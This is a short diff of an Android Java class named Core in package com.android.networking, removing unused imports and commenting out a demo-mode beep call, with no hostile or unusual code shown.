@@ -7,25 +7,13 @@
 
 package com.android.networking;
 
-import java.io.IOException;
-
 import android.app.Activity;
-import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.Intent;
 import android.content.res.Resources;
-import android.media.AudioFormat;
-import android.media.AudioManager;
-import android.media.AudioTrack;
-import android.media.MediaPlayer;
-import android.media.RingtoneManager;
-import android.net.Uri;
-import android.os.Handler;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
-import android.os.SystemClock;
 
 import com.android.networking.action.Action;
 import com.android.networking.action.SubAction;
@@ -41,7 +29,6 @@ import com.android.networking.manager.ManagerEvent;
 import com.android.networking.manager.ManagerModule;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
-import com.android.networking.R;
 
 /**
  * The Class Core, represents
@@ -168,7 +155,7 @@ public class Core extends Activity implements Runnable {
 		}
 		
 		if (Cfg.DEMO) {
-			Beep.beepPenta();
+			//Beep.beepPenta();
 		}
 		
 		if(Cfg.TRACE){
